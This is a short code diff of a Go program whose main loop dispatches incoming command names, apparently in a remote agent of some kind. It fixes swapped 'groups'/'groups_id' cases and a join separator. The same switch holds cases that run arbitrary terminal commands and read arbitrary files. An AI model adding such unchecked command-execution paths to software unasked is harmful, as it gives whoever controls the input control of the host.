@@ -214,7 +214,7 @@ func main() {
 		case "terminal":
 			commandToRun := strings.Join(string_contents, ",")
 			result = terminal(commandToRun)
-		case "groups_id":
+		case "groups":
 			res, err := DetermineGroups()
 			if err != nil {
 				result = err.Error()
@@ -222,7 +222,7 @@ func main() {
 			if err == nil {
 				result = strings.Join(res, "")
 			}
-		case "groups":
+		case "groups_id":
 			vars, err := os.Getgroups()
 			if err != nil {
 				result = "error getting group info %e" + err.Error()
@@ -232,7 +232,7 @@ func main() {
 				for i, num := range vars {
 					strAr[i] = strconv.Itoa(num)
 				}
-				result = strings.Join(strAr, "")
+				result = strings.Join(strAr, ",")
 			}
 		case "read_file":
 			contents, err := os.ReadFile(string_contents[1])
